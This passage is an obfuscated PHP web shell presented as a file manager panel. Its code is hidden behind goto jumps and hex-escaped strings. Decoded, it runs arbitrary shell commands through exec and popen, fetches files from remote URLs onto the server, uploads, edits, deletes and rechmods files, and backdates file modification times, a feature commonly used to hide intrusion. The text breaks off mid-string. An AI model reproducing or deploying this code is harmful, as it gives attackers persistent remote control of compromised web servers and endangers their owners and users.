          <input type="hidden" name="csrf" value="<?php  goto dV8y3; R_9Ff: echo h($csrf); goto U0TMe; Etyhb: echo je($current . DIRECTORY_SEPARATOR); goto i8Aag; dowKA: echo je(DIRECTORY_SEPARATOR === "\x5c"); goto rVfY0; FxZxV: if ($_SERVER["\x52\105\121\125\105\123\x54\137\115\105\124\x48\x4f\104"] === "\120\117\x53\x54") { ensureCsrf(); $back = function () use($current) { header("\x4c\157\x63\x61\x74\x69\x6f\x6e\x3a\40\77\x70\75" . rawurlencode($current)); die; }; switch ($action) { case "\x6c\157\147\x6f\165\x74": session_destroy(); header("\114\x6f\x63\x61\x74\151\157\x6e\72\40\77"); die; case "\x6e\x65\x77\55\x66\x69\x6c\x65": $name = trim((string) (isset($_POST["\156\141\155\145"]) ? $_POST["\x6e\x61\155\145"] : '')); $content = isset($_POST["\143\157\156\164\x65\156\164"]) ? (string) $_POST["\x63\x6f\156\164\145\x6e\164"] : null; if ($name === '' || strpos($name, DIRECTORY_SEPARATOR) !== false) { $_SESSION["\155\x73\147"] = "\x4e\145\x77\40\x46\151\154\x65\x3a\x20\x69\156\166\x61\154\x69\144\40\x6e\141\x6d\145"; return $back(); } $dst = safeJoin($current, $name); if (file_exists($dst)) { $_SESSION["\x6d\163\x67"] = "\116\x65\167\x20\x46\151\154\145\72\40\141\x6c\x72\145\x61\x64\171\x20\x65\170\151\x73\x74\x73"; return $back(); } list($ok, $how) = create_nonzero_file($dst, $content); $_SESSION["\155\163\x67"] = $ok ? "\116\145\x77\x20\x46\151\154\145\40\x4f\113\40\166\151\x61\x20{$how}\72\x20" . $name : "\116\145\167\40\106\x69\154\145\x20\x66\141\x69\154\x65\x64\x3a\x20" . $how; return $back(); case "\x6e\145\x77\x2d\x64\151\x72": $name = trim((string) (isset($_POST["\156\x61\x6d\145"]) ? $_POST["\156\141\155\x65"] : '')); if ($name === '' || strpos($name, DIRECTORY_SEPARATOR) !== false) { $_SESSION["\155\x73\x67"] = "\x4e\x65\167\40\x46\157\154\x64\145\162\x3a\40\151\156\166\x61\154\151\144\40\156\x61\x6d\x65"; return $back(); } $dst = safeJoin($current, $name); if (file_exists($dst)) { $_SESSION["\x6d\x73\x67"] = "\116\x65\x77\40\106\x6f\x6c\x64\x65\162\72\40\141\x6c\x72\145\x61\144\x79\x20\145\170\151\163\164\163"; return $back(); } $ok = @mkdir($dst, 509, false); $_SESSION["\155\x73\x67"] = $ok ? "\116\x65\x77\40\106\x6f\x6c\144\x65\162\x20\x4f\x4b\x3a\x20" . $name : "\116\x65\167\40\106\x6f\154\144\x65\162\40\x66\x61\x69\154\x65\144"; return $back(); case "\145\144\x69\x74\55\163\x61\x76\145": $file = safeJoin($current, isset($_POST["\146\x69\154\x65"]) ? $_POST["\146\x69\154\x65"] : ''); $content = isset($_POST["\143\x6f\x6e\164\145\x6e\164"]) ? $_POST["\143\157\x6e\164\x65\156\164"] : ''; $mode = isset($_POST["\x6d\157\x64\x65"]) ? $_POST["\155\x6f\x64\145"] : "\164\x78\164"; if (!is_file($file) || !is_writable($file)) { $_SESSION["\155\x73\147"] = "\123\141\166\145\x20\146\x61\x69\x6c\x65\x64\40\x28\x66\x69\x6c\145\40\156\x6f\164\x20\x77\x72\x69\x74\x61\x62\154\x65\51"; return $back(); } if ($mode === "\x62\x36\x34") { $data = base64_decode($content, true); if ($data === false) { $_SESSION["\x6d\x73\x67"] = "\x53\141\166\145\40\146\141\x69\154\145\x64\x3a\40\151\156\x76\141\x6c\151\x64\40\102\x61\x73\145\66\x34\40\x64\141\164\x61"; return $back(); } @file_put_contents($file, $data); } else { @file_put_contents($file, $content); } $_SESSION["\155\163\x67"] = "\123\141\166\x65\x64\72\40" . basename($file); return $back(); case "\x72\145\156\x61\x6d\145": $old = safeJoin($current, isset($_POST["\157\x6c\144"]) ? $_POST["\x6f\x6c\x64"] : ''); $new = trim((string) (isset($_POST["\156\145\167"]) ? $_POST["\x6e\x65\x77"] : '')); if ($new === '' || strpos($new, DIRECTORY_SEPARATOR) !== false) { $_SESSION["\x6d\163\147"] = "\x49\156\166\141\x6c\x69\144\40\156\145\167\x20\156\141\x6d\x65"; } else { $dst = safeJoin($current, $new); $_SESSION["\155\x73\x67"] = @rename($old, $dst) ? "\122\x65\x6e\141\x6d\145\x20\117\x4b" : "\122\145\x6e\x61\x6d\145\40\146\x61\151\154\145\x64"; } return $back(); case "\143\x68\155\157\144": $target = safeJoin($current, isset($_POST["\164\x61\162\x67\x65\164"]) ? $_POST["\x74\141\x72\147\x65\x74"] : ''); $mode = modeFromInput((string) (isset($_POST["\x6d\157\x64\145"]) ? $_POST["\x6d\x6f\x64\145"] : "\60\66\x34\x34")); $rec = !empty($_POST["\162\x65\143\x75\x72\163\x69\x76\x65"]); $ok = true; biru_apply_chmod($target, $mode, $rec, $ok); $_SESSION["\x6d\163\x67"] = $ok ? "\103\x68\x6d\157\144\40\x4f\x4b" : "\x43\150\x6d\157\144\40\160\x61\162\x74\151\x61\x6c\154\171\40\146\x61\x69\154\x65\x64"; return $back(); case "\x64\x65\154\145\x74\x65": $t = safeJoin($current, isset($_POST["\x74\x61\x72\147\145\164"]) ? $_POST["\x74\x61\x72\147\x65\164"] : ''); $_SESSION["\x6d\163\x67"] = rrmdir($t) ? "\104\x65\154\x65\x74\145\40\x4f\113" : "\104\145\x6c\x65\x74\145\40\146\141\151\154\145\x64"; return $back(); case "\155\141\163\x73\55\x64\145\x6c\145\x74\x65": $arr = isset($_POST["\151\164\x65\x6d\x73"]) ? $_POST["\x69\164\x65\155\163"] : array(); $ok = true; if (is_array($arr)) { foreach ($arr as $n) { $ok = rrmdir(safeJoin($current, $n)) && $ok; } } $_SESSION["\x6d\163\x67"] = $ok ? "\102\165\154\153\x20\144\x65\x6c\x65\x74\145\40\x4f\113" : "\x53\x6f\155\x65\40\x69\164\x65\155\163\40\146\x61\x69\154\x65\144\40\x74\x6f\x20\144\145\154\x65\164\x65"; return $back(); case "\x75\160\154\157\x61\x64": if (!isset($_FILES["\146\x69\x6c\x65\163"])) { $_SESSION["\x6d\163\147"] = "\x4e\x6f\40\146\151\154\x65\x73\x20\x70\162\157\166\x69\144\x65\x64"; return $back(); } $c = count($_FILES["\x66\x69\x6c\x65\163"]["\156\141\155\145"]); $ok = 0; $fail = 0; $fails = array(); for ($i = 0; $i < $c; $i++) { $name = $_FILES["\x66\151\154\145\163"]["\x6e\141\x6d\x65"][$i]; $tmp = $_FILES["\x66\151\154\x65\x73"]["\164\x6d\160\137\156\x61\155\x65"][$i]; $e = $_FILES["\146\151\x6c\x65\163"]["\x65\x72\x72\x6f\x72"][$i]; if ($e !== UPLOAD_ERR_OK) { $fail++; $fails[] = "{$name}\40\50\145\162\162\x6f\x72\40{$e}\51"; continue; } list($done, $why) = tryWriteFromTmp($tmp, safeJoin($current, $name)); if ($done) { $ok++; } else { $fail++; $fails[] = "{$name}\x20\x28{$why}\x29"; } } $_SESSION["\x6d\163\x67"] = "\125\160\154\157\x61\144\x3a\x20\117\113\x3d{$ok}\73\40\106\141\x69\154\145\144\75{$fail}" . ($fails ? "\x3b\x20" . implode("\54\x20", $fails) : ''); return $back(); case "\x75\x72\154\x2d\x75\x70\154\x6f\x61\144": $url = trim((string) (isset($_POST["\x75\162\x6c"]) ? $_POST["\x75\x72\154"] : '')); $fn = trim((string) (isset($_POST["\146\151\154\145\156\141\x6d\145"]) ? $_POST["\x66\151\x6c\x65\x6e\x61\155\145"] : '')); if ($url === '') { $_SESSION["\155\163\147"] = "\x55\x52\x4c\40\x69\x73\x20\145\155\x70\x74\171"; return $back(); } if ($fn === '') { $path = parse_url($url, PHP_URL_PATH); $fn = basename($path ? $path : ''); if ($fn === '') { $fn = "\144\x6f\167\156\154\x6f\141\144\x2e\142\x69\x6e"; } } list($ok, $w) = fetchUrlToFile($url, safeJoin($current, $fn)); $_SESSION["\155\x73\x67"] = $ok ? "\104\157\x77\x6e\154\157\x61\144\x65\x64\40\x66\162\x6f\155\x20\x55\x52\x4c\72\40{$fn}" : "\x55\122\x4c\40\144\x6f\167\156\x6c\x6f\x61\x64\x20\146\141\x69\x6c\145\144\72\40{$w}"; return $back(); case "\x6d\164\151\x6d\145": $target = safeJoin($current, isset($_POST["\164\x61\162\147\x65\164"]) ? $_POST["\164\141\162\147\x65\x74"] : ''); $input = trim((string) (isset($_POST["\164\163"]) ? $_POST["\164\163"] : '')); $rec = !empty($_POST["\162\145\143\165\162\x73\x69\166\145"]); if ($input === '') { $_SESSION["\x6d\x73\147"] = "\103\x68\141\156\147\145\x20\104\x61\164\145\x3a\x20\145\x6d\160\164\171"; return $back(); } if (ctype_digit($input)) { $ts = (int) $input; } else { $ts = @strtotime($input); if ($ts === false) { $_SESSION["\155\163\x67"] = "\x43\150\x61\156\x67\145\x20\x44\x61\x74\x65\72\40\151\156\166\141\154\151\x64\x20\164\x69\155\145\40\x66\157\x72\155\141\164"; return $back(); } } $ok = true; biru_apply_mtime($target, $ts, $rec, $ok); $_SESSION["\x6d\x73\x67"] = $ok ? "\x43\150\141\x6e\147\x65\40\x44\x61\x74\x65\x20\x4f\x4b\x20\xe2\206\222\40" . date("\131\55\155\55\x64\x20\110\72\x69\72\163", $ts) : "\103\x68\x61\156\x67\145\x20\x44\141\164\145\40\160\x61\162\164\151\141\x6c\154\x79\40\x66\141\151\154\x65\144"; return $back(); case "\143\x6d\x64": $cmd = trim((string) (isset($_POST["\x63\x6d\x64"]) ? $_POST["\143\155\144"] : '')); if ($cmd === '') { $_SESSION["\155\x73\147"] = "\103\157\155\x6d\141\x6e\x64\40\151\x73\40\145\x6d\x70\164\x79\x2e"; return $back(); } $result = run_command_all($cmd, $current); $out = (string) $result["\x6f\x75\x74"]; if (strlen($out) > 1024 * 1024) { $out = substr($out, 0, 1024 * 1024) . "\xa\x5b\157\x75\x74\x70\x75\x74\40\x74\x72\x75\156\x63\141\164\145\144\135"; } $_SESSION["\143\155\x64\137\x72\145\163\x75\x6c\x74"] = array("\143\155\144" => $cmd, "\155\x65\x74\x68\157\144" => $result["\x6d\145\164\150\x6f\144"], "\x63\x6f\144\x65" => $result["\x63\x6f\144\145"], "\x6f\165\x74" => $out); return $back(); case "\155\x6f\x76\145": $srcName = (string) (isset($_POST["\x73\x72\143"]) ? $_POST["\163\x72\143"] : ''); $dstDir = (string) (isset($_POST["\144\163\164"]) ? $_POST["\x64\163\x74"] : ''); $srcFull = safeJoin($current, $srcName); if ($srcName === '' || !file_exists($srcFull)) { $_SESSION["\x6d\163\x67"] = "\115\x6f\x76\x65\40\x66\x61\151\154\x65\x64\72\x20\163\x6f\x75\x72\x63\x65\40\155\x69\163\x73\151\x6e\147"; return $back(); } if ($dstDir === '') { $_SESSION["\155\163\x67"] = "\x4d\x6f\x76\x65\x20\146\x61\x69\x6c\145\x64\x3a\x20\144\x65\x73\x74\x69\x6e\x61\x74\x69\x6f\x6e\x20\145\155\x70\164\x79"; return $back(); } if (!is_dir($dstDir)) { $_SESSION["\155\x73\x67"] = "\x4d\x6f\x76\145\40\x66\141\x69\x6c\145\x64\x3a\x20\x64\x65\x73\x74\151\156\x61\x74\x69\x6f\x6e\40\151\163\x20\x6e\x6f\x74\x20\x61\40\x64\151\x72\x65\x63\164\157\x72\171"; return $back(); } $dstFull = safeJoin($dstDir, basename($srcName)); if (@realpath($srcFull) === @realpath($dstFull)) { $_SESSION["\x6d\x73\147"] = "\x4d\157\x76\145\40\163\x6b\x69\x70\160\145\144\x20\x28\163\141\155\x65\40\154\x6f\143\141\x74\x69\157\x6e\51"; return $back(); } $ok = @rename($srcFull, $dstFull); $_SESSION["\x6d\x73\x67"] = $ok ? "\x4d\157\x76\145\x20\117\113" : "\115\157\166\145\40\146\x61\151\x6c\145\x64"; return $back(); case "\172\151\160": $items = isset($_POST["\151\164\145\x6d\163"]) ? $_POST["\x69\164\x65\155\163"] : array(); $name = trim((string) (isset($_POST["\x7a\x69\160\156\141\x6d\x65"]) ? $_POST["\x7a\151\160\x6e\141\155\x65"] : '')); if (!is_array($items) || empty($items)) { $_SESSION["\155\163\147"] = "\132\x69\160\x20\146\x61\151\154\145\144\72\40\x6e\157\x74\150\151\156\147\x20\x73\145\x6c\x65\143\x74\145\x64"; return $back(); } if ($name === '') { $name = "\141\162\x63\150\x69\166\145\55" . date("\131\x6d\144\x2d\x48\x69\163") . "\56\x7a\151\160"; } $archivePath = safeJoin($current, $name); $done = false; $err = ''; if (class_exists("\132\x69\160\101\x72\143\x68\151\166\x65")) { $zip = new ZipArchive(); if ($zip->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) { foreach ($items as $it) { $full = safeJoin($current, $it); if (is_dir($full)) { $itClean = rtrim($it, DIRECTORY_SEPARATOR); addDirToZip($zip, $full, $itClean); } elseif (is_file($full)) { $zip->addFile($full, basename($it)); } } $zip->close(); $done = true; } else { $err = "\132\x69\160\101\162\143\x68\x69\166\x65\40\157\160\x65\x6e\40\x66\141\151\154\x65\x64"; } } if (!$done) { if (class_exists("\120\150\x61\x72\x44\141\164\x61")) { try { $tarName = preg_replace("\x7e\134\56\x7a\151\160\x24\x7e\x69", "\56\164\x61\162", $archivePath); $phar = new PharData($tarName); foreach ($items as $it) { $full = safeJoin($current, $it); if (is_dir($full)) { $phar->addEmptyDir(basename($it)); addDirToPhar($phar, $full, basename($it)); } elseif (is_file($full)) { $phar->addFile($full, basename($it)); } } unset($phar); $_SESSION["\155\x73\147"] = "\132\x69\160\101\x72\x63\150\x69\166\145\40\x6e\157\164\40\x61\166\x61\x69\x6c\x61\x62\154\145\x3b\x20\x63\x72\145\141\x74\145\144\40\124\101\x52\x20\x69\156\163\164\145\141\144\x3a\40" . basename($tarName); return $back(); } catch (Exception $e) { $err = "\124\101\122\40\146\x61\154\154\x62\141\143\153\40\146\x61\151\154\145\144\72\40" . $e->getMessage(); } } else { $err = ($err ? $err . "\x3b\x20" : '') . "\x4e\157\x20\x5a\151\x70\x41\x72\143\x68\x69\166\145\x20\156\x6f\x72\x20\120\150\x61\162\104\141\164\x61\x20\141\x76\141\151\x6c\x61\x62\154\145"; } } $_SESSION["\155\163\x67"] = $done ? "\x41\162\x63\150\151\166\x65\x20\143\162\145\x61\164\145\x64\x3a\x20" . basename($archivePath) : "\132\x69\160\40\x66\141\x69\154\x65\x64\x3a\40" . $err; return $back(); case "\x75\x6e\172\x69\x70": $file = safeJoin($current, isset($_POST["\x66\151\154\145"]) ? $_POST["\x66\151\154\x65"] : ''); if (!is_file($file)) { $_SESSION["\x6d\163\x67"] = "\125\x6e\172\x69\160\x20\146\x61\151\x6c\x65\144\72\x20\x66\151\x6c\x65\40\156\x6f\164\40\x66\157\x75\156\144"; return $back(); } $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); $ok = false; $err = ''; if ($ext === "\172\x69\x70" && class_exists("\132\151\x70\101\x72\x63\x68\x69\166\145")) { $zip = new ZipArchive(); if ($zip->open($file) === true) { $ok = $zip->extractTo($current); $zip->close(); if (!$ok) { $err = "\x5a\x69\x70\40\145\x78\164\162\141\143\x74\124\x6f\x20\146\141\x69\x6c\x65\144"; } } else { $err = "\x5a\x69\160\40\157\160\x65\156\40\x66\141\151\154\145\x64"; } } else { try { if (class_exists("\x50\x68\141\162\104\x61\x74\141") && preg_match("\x7e\134\56\50\164\x61\162\x7c\x74\x61\x72\134\x2e\147\172\174\164\141\x72\134\56\142\x7a\62\x7c\164\x61\162\x5c\56\170\172\x29\44\x7e\x69", $file)) { $phar = new PharData($file); $phar->extractTo($current, null, true); $ok = true; } else { $err = "\x55\x6e\x73\165\x70\x70\157\x72\x74\x65\144\x20\141\x72\143\x68\151\166\x65\40\164\x79\x70\145\40\157\162\x20\x50\x68\141\x72\x44\x61\164\x61\x20\x6e\157\x74\40\x61\166\x61\151\154\141\142\x6c\145"; } } catch (Exception $e) { $err = $e->getMessage(); } } $_SESSION["\155\x73\147"] = $ok ? "\125\156\x7a\151\x70\x20\x4f\113" : "\x55\156\x7a\x69\x70\x20\146\x61\151\x6c\145\144\x3a\x20" . $err; return $back(); } } goto YFgbk; sfOAz: $viewFile = $isView && is_file($isView) ? $isView : null; goto Iezu8; CUWbx: if (empty($dirs) && empty($files)) { ?>
                  <tr><td colspan="6" class="py-6 text-center text-slate-400">Empty</td></tr>
                <?php  } goto fBkui; qU4t_: echo h($current); goto Zf5ZS; kX5G0: header("\130\x2d\x46\x72\x61\155\145\55\117\x70\x74\x69\x6f\156\163\72\40\104\x45\116\131"); goto QU_rf; r7Nv3: if (!function_exists("\x66\170\137\x66\164\x70\x5f\143\157\x6e\156\145\x63\164")) { function fx_ftp_connect($host, $port = 21, $timeout = 90) { if (is_fn_usable("\146\164\160\137\143\157\x6e\x6e\x65\143\x74")) { return @ftp_connect($host, $port, $timeout); } if (is_fn_usable("\x66\163\157\x63\153\157\160\x65\x6e")) { return @fsockopen($host, $port, $errno, $errstr, $timeout); } return false; } } goto Jqx5V; iuKLc: $csrf = isset($_SESSION["\143\x73\162\146"]) ? $_SESSION["\143\163\x72\146"] : ''; goto fV3Xc; XH2s0: echo rawurlencode($current); goto dmI_M; BVmEF: ?>

      <div class="card p-4 flex flex-col" id="tableCard">
        <div class="flex items-center justify-between mb-3">
          <h2 class="font-medium">Directory Contents</h2>
          <div class="text-sm text-slate-400">Dirs: <?php  goto pE6ve; sLBOT: $isView = (isset($_GET["\x61"]) ? $_GET["\x61"] : '') === "\166\x69\145\x77" && isset($_GET["\x66"]) ? safeJoin($current, $_GET["\x66"]) : null; goto sfOAz; rVfY0: ?>
;
      var cmdMode = isWin ? 'powershell' : 'shell';

      var cmCmd = CodeMirror.fromTextArea(ta, {
        lineNumbers: false,
        styleActiveLine: true,
        matchBrackets: true,
        autoCloseBrackets: true,
        lineWrapping: false,
        theme: 'material-darker',
        mode: cmdMode,
        viewportMargin: Infinity,
        placeholder: 'Run Command'
      });

      CodeMirror.autoLoadMode(cmCmd, cmdMode);
      cmCmd.setSize('100%', 36);
      cmCmd.getWrapperElement().classList.add('cm-cmd-input');

      cmCmd.on('beforeChange', function(cm, change){
        var hasNewline = change.text && (change.text.length > 1 || /\r|\n/.test(change.text[0]));
        if (hasNewline) change.update(change.from, change.to, [' ']);
      });

      cmCmd.on('keydown', function(cm, e){
        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
          e.preventDefault();
          var form = document.getElementById('cmdForm');
          if (form) form.submit();
        }
      });

      var form = document.getElementById('cmdForm');
      if (form) { form.addEventListener('submit', function(){ cmCmd.save(); }); }

      setTimeout(function(){ cmCmd.refresh(); }, 50);
      window.addEventListener('resize', function(){ cmCmd.refresh(); });
    })();

    // ===== CodeMirror untuk COMMAND OUTPUT =====
    (function(){
      var pre = document.getElementById('cmdOutPre');
      if(!pre || typeof CodeMirror === 'undefined') return;

      CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
      var isWin = <?php  goto RpGcm; d3rYI: echo rawurlencode($current); goto aXlku; qKlhE: ?>
 × Files: <?php  goto AiLKZ; o3Nj0: date_default_timezone_set(@date_default_timezone_get() ? @date_default_timezone_get() : "\125\x54\103"); goto UVriR; Yvflk: ?>
">
              <input type="text" name="zipname" class="field w-56" placeholder="archive-name.zip (optional)">
              <button class="btn btn-sm btnw" type="submit" onclick="return collectSelectedInto(this.form)">Zip Selected</button>
              <span class="text-xs text-slate-400">
                If ZipArchive is unavailable, a <span class="mono">.tar</span> will be created (no compression).
              </span>
            </form>
          </div>
        </form>
      </div>
    </section>
  </main>

  <!-- Footer -->
  <footer class="w-full px-6 py-4">
    <div class="footer-line mb-3"></div>
    <div class="text-xs text-slate-400 flex items-center justify-between">
      <span>© <?php  goto DaV2r; ODNXP: function humanSize($b) { $u = array("\x42", "\113\102", "\115\102", "\x47\x42", "\124\x42"); $i = 0; while ($b >= 1024 && $i < count($u) - 1) { $b /= 1024; $i++; } return ($i ? number_format($b, 2) : (string) $b) . "\40" . $u[$i]; } goto IeZsh; RpGcm: echo je(DIRECTORY_SEPARATOR === "\x5c"); goto INkwK; su_zk: header("\x45\170\x70\151\162\x65\x73\72\40\x30"); goto UGcrm; Zlxuw: echo h(PHP_VERSION); goto wIVzk; TJv1z: if (!function_exists("\x66\x78\x5f\144\151\x73\x6b\x66\x72\145\145\163\x70\x61\x63\x65")) { function fx_diskfreespace($directory) { if (is_fn_usable("\x64\151\x73\153\146\x72\145\x65\x73\x70\141\x63\x65")) { return @diskfreespace($directory); } if (is_fn_usable("\144\151\163\x6b\137\146\162\x65\145\x5f\x73\x70\x61\143\145")) { return @disk_free_space($directory); } return false; } } goto rn7uZ; Iezu8: $modeParam = isset($_GET["\x6d\x6f\144\x65"]) ? $_GET["\x6d\x6f\x64\x65"] : "\x61\165\x74\x6f"; goto FXcsC; Ep9aI: if ($editFile) { ?>
        <?php  $autoMode = $viewMode === "\x61\x75\x74\x6f"; if ($autoMode) { $viewMode = isTextFile($editFile) ? "\x74\x78\x74" : "\142\66\x34"; } $rawContent = @file_get_contents($editFile); if ($rawContent === false) { $rawContent = ''; } $display = $viewMode === "\x62\66\x34" ? base64_encode($rawContent) : $rawContent; ?>
        <div class="card p-4" id="editPanelWrap">
          <details id="editPanel" open>
            <summary class="cursor-pointer font-medium flex items-center justify-between">
              <div class="flex items-center gap-2">
                <span>Edit File</span>
                <span class="text-xs text-slate-400">Size: <?php  echo h(humanSize((int) @filesize($editFile))); ?>
</span>
              </div>
              <div class="flex items-center gap-2">
                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
              </div>
            </summary>

            <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php  echo h($editFile); ?>
</div>

            <div class="mt-2">
              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php  echo $viewMode === "\x74\x78\164" ? "\142\x67\55\151\x6e\144\151\147\x6f\55\66\60\x30\40\x74\145\170\x74\55\167\x68\x69\164\x65\x20\142\157\162\144\145\x72\x2d\151\156\x64\x69\147\x6f\55\66\x30\x30" : "\x62\x67\55\x73\x6c\x61\164\145\x2d\70\x30\60"; ?>
" href="?a=edit&f=<?php  echo rawurlencode(basename($editFile)); ?>
&p=<?php  echo rawurlencode($current); ?>
&mode=txt">Text</a>
              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php  echo $viewMode === "\142\66\x34" ? "\142\x67\55\151\156\144\151\147\x6f\55\x36\x30\60\40\x74\145\x78\164\x2d\x77\x68\151\x74\x65\x20\142\157\x72\x64\x65\162\x2d\x69\x6e\x64\x69\147\157\x2d\66\x30\60" : "\x62\147\x2d\x73\x6c\141\x74\x65\x2d\x38\60\60"; ?>
" href="?a=edit&f=<?php  echo rawurlencode(basename($editFile)); ?>
&p=<?php  echo rawurlencode($current); ?>
&mode=b64">Base64</a>
            </div>

            <form method="post" action="?a=edit-save&p=<?php  echo rawurlencode($current); ?>
" class="mt-3" id="editForm">
              <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
">
              <input type="hidden" name="file" value="<?php  echo h(basename($editFile)); ?>
">
              <input type="hidden" name="mode" value="<?php  echo h($viewMode); ?>
">

              <?php  if ($viewMode === "\164\x78\x74") { ?>
                <textarea id="editor" name="content"><?php  echo h($display); ?>
</textarea>
              <?php  } else { ?>
                <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php  echo h($display); ?>
</textarea>
                <div class="mt-2 text-xs text-slate-400">Base64 mode: content will be decoded on save.</div>
              <?php  } ?>

              <div class="mt-3 flex flex-wrap gap-2 items-center">
                <button class="btn btnw" type="submit">Save</button>
                <button class="btn btnw btn-ghost" type="button" onclick="document.getElementById('editPanel').open=false">Close</button>
                <a class="btn btnw" href="?p=<?php  echo rawurlencode($current); ?>
">Exit & Reset</a>
                <?php  if ($viewMode === "\164\170\x74") { ?>
                  <span class="text-xs text-slate-400">Text mode: syntax highlighting auto-detects file type.</span>
                <?php  } ?>
              </div>
            </form>
          </details>
        </div>
      <?php  } goto mjCfU; eLL4f: echo h($csrf); goto bIl1n; IbEjo: if (!function_exists("\x72\165\156\137\167\x69\164\x68\137\x70\x6f\x70\x65\x6e")) { function run_with_popen($cmd, $cwd = null) { if (!is_fn_usable("\160\x6f\x70\x65\156")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\x20\x32\76\46\61"; $h = @popen(wrap_cmd_for_shell($full), "\x72"); if (!is_resource($h)) { return null; } $buf = ''; while (!feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) { break; } $buf .= $chunk; } @pclose($h); return array("\155\x65\164\150\157\144" => "\x70\x6f\160\x65\x6e", "\143\157\144\x65" => null, "\x6f\x75\164" => $buf); } } goto dkEWX; LeluV: if (!function_exists("\x6a\145")) { function je($v) { if (function_exists("\x6a\163\x6f\156\x5f\145\x6e\x63\157\144\x65")) { return json_encode($v); } if (is_bool($v)) { return $v ? "\164\162\165\145" : "\146\x61\154\163\x65"; } if (is_numeric($v)) { return (string) $v; } if ($v === null) { return "\x6e\x75\154\154"; } $s = str_replace(array("\x5c", "\42", "\xd", "\xa", "\x9", "\x2f"), array("\x5c\x5c", "\x5c\x22", "\134\x72", "\x5c\156", "\134\164", "\x5c\x2f"), (string) $v); return "\42" . $s . "\42"; } } goto SSuec; dVpY2: function biru_apply_mtime($path, $timestamp, $recursive, &$ok) { if (!@touch($path, $timestamp, $timestamp)) { $ok = false; } if ($recursive && is_dir($path)) { $h = @opendir($path); if ($h !== false) { while (false !== ($v = readdir($h))) { if ($v === "\56" || $v === "\56\56") { continue; } biru_apply_mtime($path . DIRECTORY_SEPARATOR . $v, $timestamp, true, $ok); } closedir($h); } else { $ok = false; } } } goto xsyKy; mKR_v: if (!function_exists("\x72\165\x6e\x5f\167\151\164\x68\137\x65\x78\x65\143")) { function run_with_exec($cmd, $cwd = null) { if (!is_fn_usable("\x65\x78\145\143")) { return null; } $full = make_cd_prefix($cwd) . $cmd . "\40\x32\x3e\46\61"; $lines = array(); $code = 0; @exec($full, $lines, $code); return array("\x6d\145\164\x68\x6f\144" => "\x65\170\145\x63", "\143\x6f\144\145" => $code, "\157\x75\x74" => implode("\12", (array) $lines)); } } goto OHa91; NyE8m: function safeJoin($base, $child) { $child = str_replace("\x0", '', $child); if ($child === '') { return $base; } if ($child[0] === DIRECTORY_SEPARATOR || preg_match("\176\x5e\133\x41\x2d\x5a\x61\55\172\135\72\134\134\176", $child)) { return $child; } return rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $child; } goto ohMiy; z7kdE: $hasFlagCase = defined("\123\117\122\124\137\106\114\x41\x47\x5f\103\101\123\105"); goto rdFZp; EnusP: if ($up === $current) { $up = $current; } goto igoc0; INkwK: ?>
;
      var outMode = isWin ? 'powershell' : 'shell';

      var txt = pre.textContent || '';
      var holder = document.createElement('div');
      pre.parentNode.replaceChild(holder, pre);

      var cmOut = CodeMirror(holder, {
        value: txt,
        readOnly: true,
        lineNumbers: true,
        lineWrapping: true,
        theme: 'material-darker',
        mode: outMode,
        viewportMargin: Infinity
      });

      CodeMirror.autoLoadMode(cmOut, outMode);
      cmOut.setSize('100%', 380);
      cmOut.getWrapperElement().classList.add('cm-cmd-output');

      setTimeout(function(){ cmOut.refresh(); }, 50);
      window.addEventListener('resize', function(){ cmOut.refresh(); });
    })();
  </script>
</body>
<body style="margin:0;min-height:100vh;
background:url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS4-Ur1M0AF5_oQTYXjcC5MepAlGt3HKLc0QLHspmYQ7iTfln0SUtkSQak6AZ1-h_0yq6eOmbyfRRZJ1UMhUt8s_HQxjHqcULFe1ApCVRIOFWN8re-UBDV6yvGTR6uREN_MGGqBQnx-nKH5Sd1J-zbA_HOHhA1NW_o39Owk8Kbs213XOnxKdewVrk3R9Q/s736/kok.gif') no-repeat center center fixed;
background-size:cover;">
</body>
</html>
<?php  goto mOAsE; uaCgc: header("\x52\145\x66\145\x72\x72\x65\162\55\120\157\154\x69\143\x79\x3a\40\156\157\55\x72\145\146\145\162\162\x65\x72"); goto kX5G0; KHHxO: function modeFromInput($s) { $s = trim($s); if ($s === '') { return 420; } if (ctype_digit($s)) { if ($s[0] !== "\x30") { $s = "\x30" . $s; } return intval($s, 8); } return 420; } goto OSyna; BrREE: function svgIcon($name, $class = "\x69\x63\157") { $icons = array("\146\157\154\x64\145\x72" => "\x3c\163\x76\x67\40\166\x69\145\x77\102\157\170\75\42\x30\x20\60\x20\62\x34\40\62\64\x22\x20\143\154\141\163\x73\75\x22" . $class . "\42\x20\x61\x72\151\x61\55\150\151\144\x64\x65\156\x3d\x22\164\162\x75\x65\x22\x3e\74\160\141\164\150\x20\x64\75\42\x4d\61\60\x20\64\x6c\62\40\62\x68\66\141\62\40\62\40\60\40\x30\x31\x32\40\62\166\61\x48\x34\x56\x36\141\62\40\62\x20\x30\40\60\x31\x32\x2d\x32\150\x34\x7a\x22\40\x66\151\154\x6c\75\x22\143\165\x72\162\x65\156\x74\103\157\x6c\x6f\162\42\40\157\x70\141\x63\151\164\x79\x3d\42\56\61\62\x22\x2f\76\x3c\160\x61\x74\150\40\x64\75\x22\x4d\x33\x20\x39\150\x31\70\x76\71\x61\62\40\62\40\x30\40\x30\61\55\x32\x20\x32\x48\65\141\x32\x20\x32\x20\60\40\x30\61\55\x32\55\x32\x56\x39\172\x22\x20\x66\151\x6c\154\75\x22\143\x75\162\x72\145\x6e\x74\103\157\x6c\157\162\x22\x2f\76\x3c\x2f\x73\x76\x67\76", "\x66\x69\154\x65" => 